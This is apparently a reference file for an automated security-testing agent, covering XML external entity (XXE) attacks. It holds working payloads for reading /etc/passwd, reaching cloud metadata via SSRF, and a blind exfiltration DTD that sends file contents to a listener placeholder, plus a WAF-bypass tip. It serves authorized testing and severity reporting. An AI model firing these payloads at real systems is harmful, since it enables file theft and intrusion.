# XXE — depth reference

Load when `probe_xxe` confirmed an XML parser reachable from a request body.
The highest-yield door on modern stacks is content-type confusion — cover it
before hand-crafting DOCTYPEs on an XML endpoint.

## Content-type confusion (the reliable door)

A JSON endpoint whose parser is picked by `Content-Type` may accept
`application/xml` / `text/xml` into an entity-capable parser. Post the *same
shape* as the JSON body, as XML, with a benign internal entity in the echoed
field:

```xml
POST /api/echo HTTP/1.1
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY x "canary-xxe">]>
<r><field>&x;</field></r>
```

- echoes `canary-xxe` → entity resolved, parser is entity-capable — escalate
- literal `&x;` / rejected content-type / DOCTYPE parse error → falsified for
  that route

Send both `application/xml` and `text/xml` — they can reach different parser
configs. Test *every* POST route this way; the one that accepts XML is rarely
the obvious XML-looking endpoint. A WAF that inspects JSON may not inspect
XML bodies — the same probe doubles as a filter bypass.

## Escalate ladder

| Step | Entity | Reads |
|---|---|---|
| external file | `<!ENTITY x SYSTEM "file:///etc/passwd">` | local file, echoed |
| SSRF | `<!ENTITY x SYSTEM "http://169.254.169.254/…">` | internal HTTP (blind or echoed) |
| parameter entity | `<!ENTITY % e SYSTEM "http://<oob>/e.dtd"> %e;` | exfil when echo is blind |
| error channel | file URL whose contents surface in a parse error | blind exfil via error text |

Windows targets: `file:///c:/windows/win.ini` is the standard canary.

## Blind XXE exfiltration

No echo → parameter-entity DTD hosted on a listener you control:

```xml
<!-- hosted e.dtd -->
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % wrap "<!ENTITY send SYSTEM 'http://<oob>/?d=%file;'>">
%wrap; %send;
```

The outbound HTTP hit on your listener is itself the evidence — record it
via `note` and cite the exchange carrying the injected DOCTYPE.

## XInclude fallback

DOCTYPE stripped but body parsed → `<xi:include
href="file:///etc/passwd" parse="text"/>` inside the document (namespace
`http://www.w3.org/2001/XInclude`) works on many parsers with entities
disabled.

## Severity guide

- Local file read or cloud-metadata reach shown: high
- Entity resolution confirmed, exfil path demonstrated via OOB: high
- Entity resolves but only internal-entity echo shown: medium — say exactly
  what was proven
